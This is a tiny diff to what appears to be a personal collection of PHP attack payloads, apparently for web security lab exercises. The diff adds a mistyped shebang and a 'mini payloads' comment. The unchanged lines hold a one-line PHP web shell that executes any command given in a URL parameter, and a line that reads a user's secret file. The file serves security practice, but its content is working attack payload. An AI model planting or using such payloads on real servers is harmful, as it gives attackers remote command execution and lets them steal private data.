@@ -1,2 +1,6 @@
+#!/usr/bin/peno
+
+#mini payloads
+
 <?php system($_GET['cmd']);?>
 <?php echo file_get_contents('/home/carlos/secret'); ?>	
